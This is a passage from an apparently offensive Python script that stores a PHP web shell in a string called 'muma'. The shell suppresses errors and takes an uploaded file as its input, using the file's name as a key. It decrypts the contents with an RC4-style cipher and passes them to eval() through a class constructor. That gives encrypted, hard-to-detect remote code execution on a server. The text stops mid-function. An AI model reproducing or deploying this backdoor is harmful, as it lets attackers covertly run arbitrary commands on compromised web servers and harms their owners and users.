#!/usr/bin/python3
# -*- coding=utf-8 -*-

muma = '''
<?php
@error_reporting(0);
session_start();
$FILE_FIELD='code';
if(!isset($_FILES[$FILE_FIELD])||empty($_FILES[$FILE_FIELD]['name'])){
	return;
}
$key = $_FILES[$FILE_FIELD]['name'];
$_SESSION['k']=$key;
$post=file_get_contents($_FILES[$FILE_FIELD]['tmp_name']);
$post=encrypt($post, $key,true);
$arr=explode('|',$post,2);
$func=$arr[0];
$params=$arr[1];
class C{public function __construct($p) {eval($p."");}}
@new C($params);
function encrypt($string,$key='',$decode=false){
    $key=md5($key);
    $key_length=strlen($key);
    $string=$decode?base64_decode($string):substr(md5($string.$key),0,8).$string;
    $string_length=strlen($string);
    $rndkey=$box=array();
    $result='';
    for($i=0;$i<=255;$i++){
        $rndkey[$i]=ord($key[$i%$key_length]);
        $box[$i]=$i;
    }
    for($j=$i=0;$i<256;$i++){
        $j=($j+$box[$i]+$rndkey[$i])%256;
        $tmp=$box[$i];
        $box[$i]=$box[$j];
        $box[$j]=$tmp;
    }
    for($a=$j=$i=0;$i<$string_length;$i++){
        $a=($a+1)%256;
        $j=($j+$box[$a])%256;
        $tmp=$box[$a];
        $box[$a]=$box[$j];
        $box[$j]=$tmp;
        $result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
    }
    if($decode){
        if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8)){
            return substr($result,8);
        }else{
            return '';
        }
    }else{
        return 
